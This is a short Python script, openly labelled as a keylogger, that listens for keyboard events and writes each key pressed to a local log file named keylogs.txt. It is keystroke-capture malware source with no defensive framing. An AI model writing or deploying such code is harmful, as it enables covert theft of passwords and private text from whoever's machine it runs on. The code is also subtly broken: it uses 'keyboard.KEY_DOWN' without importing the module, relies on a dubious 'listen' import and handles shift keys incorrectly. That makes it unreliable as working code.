import sys
import logging
from keyboard import KeyboardEvent, listen

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler('keylogs.txt')
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

def log_event(e: KeyboardEvent):
    if e.event_type == keyboard.KEY_DOWN:
        if e.name in ['space', 'enter']:
            logger.debug(' ')
        elif e.name.startswith('shift+'):
            logger.debug(e.name[6:])
        else:
            logger.debug(e.name)
    return True

def main():
    try:
        print("Starting keylogger...")
        listen(log_event)
    except Exception as e:
        print("Error: ", str(e))
        sys.exit()

if __name__ == "__main__":
    main()